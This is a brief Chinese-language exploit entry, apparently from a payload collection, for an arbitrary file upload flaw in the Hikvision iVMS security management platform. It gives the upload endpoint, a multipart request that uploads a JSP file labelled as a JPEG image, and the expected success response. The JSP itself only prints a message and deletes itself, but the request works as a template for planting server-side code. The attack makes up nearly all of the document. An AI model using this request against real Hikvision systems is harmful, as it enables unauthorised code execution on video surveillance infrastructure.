# HIKVISIONiVMS综合安防管理平台resourceOperations任意文件上传

海康 ｜ 命令执行 ｜ —
- **请求**：`POST /eps/api/resourceOperations/upload?token=Token HTTP/1.1`

**Payload**
```
------WebKitFormBoundaryTJyhtTNqdMNLZLhj
Content-Disposition: form-data; name="fileUploader"; filename="test.jsp"
Content-Type: image/jpeg
<%out.print("hello world");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundaryTJyhtTNqdMNLZLhj--
```
- **响应特征**：200